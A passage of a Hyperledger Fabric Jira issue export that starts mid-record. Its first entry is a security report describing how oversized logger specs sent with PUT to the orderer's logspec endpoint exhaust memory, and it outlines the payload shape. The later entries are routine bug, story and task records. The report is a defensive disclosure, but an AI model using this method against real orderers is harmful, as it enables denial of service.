[http://localhost:8443|http://localhost:8443/] is orderer's operations server.
Wait for a while after the command runs. The memory usage of orderer will increase dramatically (One of my tests shows about 10GB more VIRT memory is occupied).

*Explanation:*
The problem is in "" _func (l *LoggerLevels) ActivateSpec(spec string) "" in [loggerlevels.go|https://github.com/hyperledger/fabric/blob/master/common/flogging/loggerlevels.go] ._ This function is called whenever above http link ([http://localhost:8443/logspec]) is accessed using PUT method. And it will parse the spec string (which is stored in payload.txt and uploaded using above command), and will store the information in a mapping specs.
 
|// The logging specification has the following form:|
// [<logger>[,<logger>...]=]<level>[:[<logger>[,<logger>...]=]<level>...]
 
The ActivateSpec() has no filter or test to check if the input spec is of appropriate length. So what if logger is a *very long* string?
In payload.txt, I constructed a spec with a number of very long loggers. Each logger was about 55K chars and the spec included about 30000 loggers. Essentially the spec just looks like
             \{""spec"": ""VERYLONGLOGGER1, VERYLONGLOGGER2, VERYLONGLOGGER3,......, VERYLONGLOGGERN=debug""}
ActivateSpec() function will put these very large strings in the mapping, which will lead to a very large amount of memory occupied.
 
*More tests:*
Due to low-level http timeout, the payload *cannot be too big*. I have ever constructed a 4GB spec but sending it always failed and could never reach ActivateSpec(). So there may be a upper limit for the amount of memory occupied.
If you run the above command several times, the memory usage may get even bigger. I guess it maybe is related to golang
h1. Garbage Collector
Garbage Collector but I did not dig that deep. You can test it by using a script to run the command several times or even to run parallelly 2 or 3 processes (more processes will get wrong result also because of http timeout).
During the tests, I also noticed that while the memory usage increased the CPU usage was also very high. If the attack runs continuously, the *performance of orderer* may also experience negtive impact.
h1. Garbage Collector
 
*Threat level*:
Default config will have operations server only listening on localhost 8443 port, which makes the attack feasible only on local machine.
If operations server is listening on port that is accessible from outside, it is a security problem. Anyone can try crash the orderer process using above attack (unless orderers are all running on machines with memory much more than 32GB).
 
*Test environment*:
docker images:  fabric-orderer   amd64-2.2.0-snapshot-55308c7c4
docker version: 19.03.9.
go version: 1.14.2
OS: Linux debian buster 4.19.0-6-amd64, 32GB memory, 5GB swap.",,denyeart,mastersingh24,ryjones,,,,,,,,,,,,,,,,,,Security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01dv7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,mastersingh24,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Discovery service forgets chaincodes on peer restart,FAB-18026,45475,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,colismit,colismit,26/Jun/20 12:50 AM,12/Oct/20 11:26 AM,28/Oct/23 3:10 AM,12/Oct/20 11:26 AM,v2.0.0,v2.1.0,,,,,,,,,,,,,,,,,,,,,1,,,,,,"Hi,
I'm seeing an issue with the Fabric 2.0 - 2.1 discovery service, in that, when an individual peer is stopped/started, the chaincodes installed/instantiated on a channel are forgotten and don't appear in the Chaincodes list.
Checking on the peer itself, the chaincode is both installed, and instantiated when it comes back up, and I can invoke the chaincode normally. i.e. it works normally.

I've tested it with release-2.0.0 and tag v2.1.1

Is there a way to re-discover the instantiated chaincodes?",,colismit,denyeart,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18194,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01dvv:",,,,Unset,Unset,,"Bring up a hyperledger network, add channel and deploy chaincode etc.

Make a discovery query. Stop one of the peers.

e.g. docker stop peer-0

Restart the peer.

docker start peer-0

Query discovery service. The discovery response is missing the instantiated abac38 chaincode on peer-0 after it was restarted.

[
  {
    ""MSPID"": ""OrgMSP"",
    ""LedgerHeight"": 6,
    ""Endpoint"": ""peer-1.Org:7051"",
    ""Identity"": ""-----BEGIN CERTIFICATE----- [....snipped....] -----END CERTIFICATE-----\n"",
    ""Chaincodes"": [
      ""_lifecycle"",
      ""abac38""
    ]
  },
  {
    ""MSPID"": ""OrgMSP"",
    ""LedgerHeight"": 6,
    ""Endpoint"": ""peer-0.Org:7051"",
    ""Identity"": ""-----BEGIN CERTIFICATE----- [....snipped....] -----END CERTIFICATE-----\n"",
    ""Chaincodes"": [
      ""_lifecycle""
    ]
  },
  {
    ""MSPID"": ""OrgMSP"",
    ""LedgerHeight"": 6,
    ""Endpoint"": ""peer-2.Org:7051"",
    ""Identity"": ""-----BEGIN CERTIFICATE----- [....snipped....] -----END CERTIFICATE-----\n"",
    ""Chaincodes"": [
      ""_lifecycle"",
      ""abac38""
    ]
  }
]
",,Unset,,,,,,Unset,,Unset,,(Please add usage information),colismit,denyeart,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Jul/20 11:00 PM;denyeart;I'm not able to reproduce the problem.

[~colismit]Do your data volumes remain when you restart the peer? That is, do you still see the chaincode in the peer chaincode directory, e.g. /var/hyperledger/production/lifecycle/chaincodes/ after restart?

What does ""peer lifecycle chaincode queryinstalled"" against the peer return?;;;","08/Jul/20 6:03 PM;colismit;I'll look in more detail at our setup and see if I can make reproduction more specific.;;;","08/Jul/20 7:31 PM;yacovm;You need to look if the peer is in the membership list or not. If it's not, then it's by design.

If you restart the peer, peers will detect this and cease communication and evict the peer from the membership.

They will try to probe it in the next scan but it'll take some time, I think the default sweep interval is 20 seconds.;;;","08/Jul/20 11:08 PM;colismit;The data volumes are there.

However the path differs.
{code:java}
sh-4.2# ls -l /var/hyperledger/production/lifecycle/chaincodes
total 0
sh-4.2# ls -l /var/hyperledger/production/chaincodes
total 8
-rw-r--r-- 1 root root 1960 Jul 8 11:40 abac2.v1.0
-rw-r--r-- 1 root root 1960 Jul 8 11:40 abac2.v1.1{code}
 

And the peer lifecycle command doesn't see it either.

 
{code:java}
sh-4.2# peer lifecycle chaincode queryinstalled
Installed chaincodes on peer:
 
{code}
But the peer chaincode command does.
{code:java}
sh-4.2# peer chaincode list --installed
Get installed chaincodes on peer:
Name: abac2, Version: v1.0, Path: github.com/hyperledger/fabric-samples/chaincode_example/go/, Id: da6964ea05edf8e16d3998b34f5ac1cfd443acc759c23faac85bdb24c6548b69
Name: abac2, Version: v1.1, Path: github.com/hyperledger/fabric-samples/chaincode_example/go/, Id: 8ef75fe2f7186d552e3cec095999d042babb9bf4a954c760338d088fccaef9fa{code}
 

This chaincode is installed and tested by some of our test code written in python, using the python SDK.

I take it that discovery requires the new lifecycle?

 ;;;","08/Jul/20 11:28 PM;yacovm;Discovery works in both lifecycles since it was implemented in 1.2;;;","12/Oct/20 11:26 AM;denyeart;Fixed in *FAB-18194* in v2.2.1.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add function to create an application channel genesis block,FAB-18027,45476,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,26/Jun/20 1:33 AM,26/Jun/20 5:56 AM,28/Oct/23 3:10 AM,26/Jun/20 5:56 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"The channel participation API enables joining an application channel from a genesis block (i.e. there is no system channel and no system channel genesis block). The configtx library should be enhanced to provide a way to create one. An application channel genesis block should consist of the Orderer and Application sections (the Consortiums section only applies to system channel configuration and should not be included).

 

Acceptance: I can call function ""NewApplicationChannelGenesisBlock"" with a channel config and channel ID and it returns a genesis block (i.e. block with block number 0) that can be used to create a channel using an OSN that does not have a system channel.",,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17910,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i01dw3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Jun/20 3:17 AM;wlahti;[https://github.com/hyperledger/fabric-config/pull/31];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create new propagateEnvironment key to supersede the existing list configuration,FAB-18028,45477,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,sykesm,sykesm,26/Jun/20 4:00 AM,01/Jul/20 12:55 AM,28/Oct/23 3:10 AM,01/Jul/20 12:55 AM,v2.2.0,,,,,,,,,v2.2.0,v2.x,,,fabric-peer,,,,,,,,,0,ipm,,,,,"{{core/peer/config.go}} defines the following configuration structure:

{code:go}
// ExternalBuilder represents the configuration structure of
// a chaincode external builder
type ExternalBuilder struct {
	EnvironmentWhitelist []string `yaml:""environmentWhitelist""`
	Name                 string   `yaml:""name""`
	Path                 string   `yaml:""path""`
}
{code}

We should create a new key to capture the environment variables to propagate and deprecate the existing one. The field should be renamed as well (leaving only the tag) to include some indication that it has been intentionally removed.

At runtime, if the new key is set, it will supersede the old. Documentation and test fixtures should also be updated to use the new {{propagateEnvironment}} key.",,btl5037,sykesm,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzohk",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,sykesm,ymlbright,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.2,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jun/20 2:31 PM;btl5037;[https://github.com/hyperledger/fabric/pull/1476];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
rm old proto related code from transient store,FAB-18029,45478,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,26/Jun/20 4:43 PM,27/Jun/20 10:52 AM,28/Oct/23 3:10 AM,27/Jun/20 10:52 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01dwj:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent IT failure in integration/gossip/gossip_test.go,FAB-18030,45479,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,wenjian,wenjian,26/Jun/20 10:03 PM,27/Jun/20 6:11 AM,28/Oct/23 3:10 AM,27/Jun/20 6:11 AM,,,,,,,,,,v2.2.0,,,,,,,,,,,,,0,ci-flake,,,,,"Got the following failure:

2020-06-26T12:40:02.0392904Z Waiting for: 2020-06-26T12:40:02.0393318Z Removing member: Endpoint: 127.0.0.1:21514[0m 2020-06-26T12:40:02.0393516Z 2020-06-26T12:40:02.0393800Z /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/gossip/gossip_test.go:343

[https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/16446/logs/57]

 ",,denyeart,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01dwr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,wenjian,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jun/20 4:37 AM;wenjian;Root cause:

When a peer is started/restarted, the test should wait until the peer has discovered all other peers before it continues the rest of tests. Otherwise, it may cause a flake because the other peer stops too soon before this peer can discover it.;;;","27/Jun/20 6:10 AM;denyeart;https://github.com/hyperledger/fabric/pull/1474;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Integration test for join channel with genesis block as a follower,FAB-18031,45480,45221,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,27/Jun/20 1:15 AM,25/Aug/20 11:05 AM,28/Oct/23 3:10 AM,25/Aug/20 11:05 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"Join application channel with genesis block as a follower.

Start a 3 node raft cluster without a system channel. Submit a few transactions form the  ledger height to be >>1.

Start a 4th node w/o channels. Get the genesis block from one of 3 cluster nodes and join the channel on the 4th.

Check that the 4th node pulls all the blocks.

Submit more transactions and verify that the 4th node pulls them too.",,tock,wlahti,,,,,,,,,,,,,,,,,,,,FAB-18167,,,,,,,,,,,,,,,,,,FAB-18019,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01dwz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,wlahti,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Aug/20 6:14 AM;wlahti;[https://github.com/hyperledger/fabric/pull/1735];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement import data function for statecouchdb to enable loading of a channel data from a snapshot,FAB-18032,45483,44706,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,27/Jun/20 10:53 AM,29/Jul/20 12:17 AM,28/Oct/23 3:10 AM,29/Jul/20 12:17 AM,,,,,,,,,,v2.3.0,,,,fabric-ledger,,,,,,,,,0,,,,,,,,manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01dxn:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Jul/20 12:17 AM;manish-sethi;https://github.com/hyperledger/fabric/pull/1616;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Generate pvtstore data for a channel using the hashed data snapshot file,FAB-18033,45484,44706,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,Senthil1,Senthil1,27/Jun/20 10:54 AM,05/Oct/20 10:22 PM,28/Oct/23 3:10 AM,05/Oct/20 10:22 PM,,,,,,,,,,v2.3.0,,,,fabric-ledger,,,,,,,,,0,,,,,,,,manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01dxv:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Sep/20 1:11 PM;manish-sethi;- PR for implementing pvtdata hashes consumer - [https://github.com/hyperledger/fabric/pull/1908]
 - PR for registering pvtdata hashes consumer and populating the store - [https://github.com/hyperledger/fabric/pull/1927]
 - PR for validating the pvtdata supplied by the reconciler - https://github.com/hyperledger/fabric/pull/1947

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Improve FabCar docs, for easier to comprehend the context of fabcar app",FAB-18034,45492,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sijo.c,sijo.c,sijo.c,28/Jun/20 12:43 PM,03/Aug/20 8:06 PM,28/Oct/23 3:10 AM,03/Aug/20 8:06 PM,v2.1.0,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"* Improve FabCar docs with clearer separation about FabCar Application and Smart Contract. During first time read & trails, I found it confusing and hard to understand the context and all the components involved.
 ** [https://hyperledger-fabric.readthedocs.io/en/latest/write_first_app.html] 
 * Fabcar samples in various languages can be linked better in the docs",,sijo.c,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01dzn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sijo.c,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jun/20 2:39 AM;sijo.c;[https://github.com/hyperledger/fabric/pull/1480];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Orderer w/o sys-channel, joins app channel with join-block, create follower",FAB-18035,45494,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,28/Jun/20 11:11 PM,07/Jul/20 10:49 PM,28/Oct/23 3:10 AM,07/Jul/20 10:49 PM,,,,,,,,,,v2.2.0,,,,fabric-orderer,,,,,,,,,0,,,,,,"An orderer w/o a system channel joins an app channel with a join block.

In this task the etcdraft consenter creates a skeleton implementation of follower chain.",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01e03:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add URL to List Single channel,FAB-18036,45496,40568,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,tock,tock,29/Jun/20 3:57 PM,01/Jul/20 10:43 AM,28/Oct/23 3:10 AM,01/Jul/20 10:43 AM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,The REST API should fill in the URL after getting the ChannelInfo from the Registrar.,,tock,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01e0j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,wlahti,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jun/20 10:16 PM;wlahti;[https://github.com/hyperledger/fabric/pull/1484];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Disable channel participation API in v2.2,FAB-18037,45500,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,30/Jun/20 1:21 AM,30/Jun/20 3:57 PM,28/Oct/23 3:10 AM,30/Jun/20 3:57 PM,,,,,,,,,,v2.2.0,,,,fabric-orderer,,,,,,,,,0,,,,,,Hard-code channel participation API to disabled and remove section from sampleconfig/orderer.yaml.,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17712,,,No,,Unset,No,,,"1|i01e1f:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.2,mergify/bp/release-2.2/pr-3750,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jun/20 2:28 AM;wlahti;[https://github.com/hyperledger/fabric/pull/1487];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent IT failure in e2e statsd metric check,FAB-18038,45501,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,,caod,caod,30/Jun/20 6:26 AM,03/Jul/20 12:37 AM,28/Oct/23 3:10 AM,03/Jul/20 12:37 AM,,,,,,,,,,,,,,fabric-common,,,,,,,,,0,ci-flake,,,,,"[It] executes a basic solo network with 2 orgs and no docker

This one has been popping up a couple times in CI recently [https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=16678&view=logs&jobId=bb7536ee-f85d-55d2-3480-16135713d76e&j=bb7536ee-f85d-55d2-3480-16135713d76e&t=23fa8973-8842-5476-5795-52dd065c9721]

 

logs attached",,btl5037,caod,denyeart,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/20 6:25 AM;caod;06-29-20.log;https://jira.hyperledger.org/secure/attachment/18407/06-29-20.log",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01e1n:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,caod,denyeart,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/20 6:46 AM;caod;Again: [https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=16681&view=logs&jobId=bb7536ee-f85d-55d2-3480-16135713d76e&j=bb7536ee-f85d-55d2-3480-16135713d76e&t=23fa8973-8842-5476-5795-52dd065c9721];;;","30/Jun/20 7:24 AM;btl5037;I'd post that we hit it again, but it seems most PR's are hitting it at least once;;;","02/Jul/20 12:15 AM;wlahti;I hit this three times in a row on a PR. Figured I'd take a look. For now, I tried updating our metrics library dependency to see if that helps: [https://github.com/hyperledger/fabric/pull/1514/];;;","02/Jul/20 10:10 PM;denyeart;[https://github.com/hyperledger/fabric/pull/1527]

Looks like this fixed it, I also backported to release-2.2.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[It] executes a basic solo network with 2 orgs and no docker,FAB-18039,45502,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Duplicate,,btl5037,btl5037,30/Jun/20 7:11 AM,30/Jun/20 7:16 AM,28/Oct/23 3:10 AM,30/Jun/20 7:16 AM,,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,ci-flake,,,,,"Seeing this flake all over the place

[https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=16681&view=logs&j=bb7536ee-f85d-55d2-3480-16135713d76e&t=23fa8973-8842-5476-5795-52dd065c9721&s=d654deb9-056d-50a2-1717-90c08683d50a]

org1_peer0 statsd metrics are empty, it doesn't look like it's crashed.

I don't see anything interesting in the logs other that some warnings with gRPC failing to connect to endpoints.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01e1v:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTEgo support multi connection profile,FAB-18040,45508,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,dongming,dongming,dongming,01/Jul/20 3:20 AM,21/Jul/20 11:06 PM,28/Oct/23 3:10 AM,21/Jul/20 11:06 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Both IBP and operator generator per-org base connection profiles.  PTEgo will need to support multiple connection profiles.,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17974,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz2qi",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Add node.js chaincode to ""chaincode as an external service"" section",FAB-18041,45509,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,shimos,shimos,shimos,01/Jul/20 5:28 AM,30/Sep/20 6:43 AM,28/Oct/23 3:10 AM,19/Jul/20 1:19 PM,v2.2.0,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"Now that FABCN-406 is merged into “fabric-chaincode-node”, description for node.js chaincode should be added to the “Chaincode as an external service” section.

 ",,shimos,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABCN-406,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01e37:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),shimos,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.2,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
